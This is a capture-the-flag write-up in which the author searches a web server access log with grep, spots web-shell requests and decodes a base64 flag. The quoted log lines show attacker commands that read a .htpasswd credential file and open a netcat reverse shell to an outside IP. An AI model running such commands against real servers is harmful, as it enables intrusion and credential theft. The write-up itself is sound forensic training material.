# Problem Statement:
![question](https://raw.githubusercontent.com/0x41head/CTF-Writeups/main/src/DOA2021ctf/Log%20Analysis/Ingress/ques.png)

## Solution:

This challenge came along with `attack.7z` file which when extracted gave me `attack.log`.

I tried using `grep` with a bunch of words including but not limited to `DO{`, `flag` etc. before trying `pass`

```
strings attack.log| grep -i 'pass' 
2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
```
This looked suspicious to me so I found the line number of the above log incident.
```
$ strings attack.log| grep  -n 'pass' 
37628:2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
```
We can see that the line number is 37628. So I tried to output 10 lines above and below 37628
```
$ strings attack.log| grep  -n -i 'pass' -B10 -A10 
37618-2021-09-06 20:45:36 135.233.142.30 GET runtime-es5.43df09c2199138dc23a5.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/schedule-edition-2021 200 0 0 23
37619-2021-09-06 20:45:36 135.233.142.30 GET dovercon/sponsoring-edition-2021 - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/schedule-edition-2021 200 0 0 23
37620-2021-09-06 20:45:46 135.233.142.30 GET ywesusnz cmd%3Dnetstat+-peanut 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 21
37621-2021-09-06 20:45:47 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 27
37622-2021-09-06 20:45:47 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 29
37623-2021-09-06 20:45:47 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 21
37624-2021-09-06 20:45:47 135.233.142.30 GET ctf/about - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/dovercon/sponsoring-edition-2021 200 0 0 20
37625-2021-09-06 20:45:59 135.233.142.30 GET assets/images/ctf/2021-autumn/ractf_logo.svg - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 20
37626-2021-09-06 20:45:59 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 26
37627-2021-09-06 20:45:59 135.233.142.30 GET dovercon/speakers-edition-2021 - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) https://digitaloverdose.tech/ctf/about 200 0 0 21
37628:2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
37629-2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 26
37630-2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 20
37631-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 22
37632-2021-09-06 20:48:00 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 21
37633-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/l/email-protection - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 28
37634-2021-09-06 20:48:00 135.233.142.30 GET privacy - 443 - 185.159.245.168 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) - 200 0 0 25
37635-2021-09-06 20:48:00 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 25
37636-2021-09-06 20:48:00 135.233.142.30 GET polyfills-es2015.891d5b00ef96a8ae9449.js - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 22
37637-2021-09-06 20:48:00 135.233.142.30 GET dovercon/2021/mentors - 443 - 185.227.109.194 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148+Webkit+based+browser - 200 0 0 29
37638-2021-09-06 20:48:00 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js - 443 - 54.192.35.96 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/81.0.4044.138+Safari/537.36 - 200 0 0 20

```

I saw that line 37629 had some base64 encoded text. Deciphring this I retrived the flag
```
DO{better_remove_that_backdoor}
```
### Notes:
### Reference:
https://www.joeldare.com/wiki/linux:grep_a_range_of_lines
### Tags:
`Log` `Analysis` 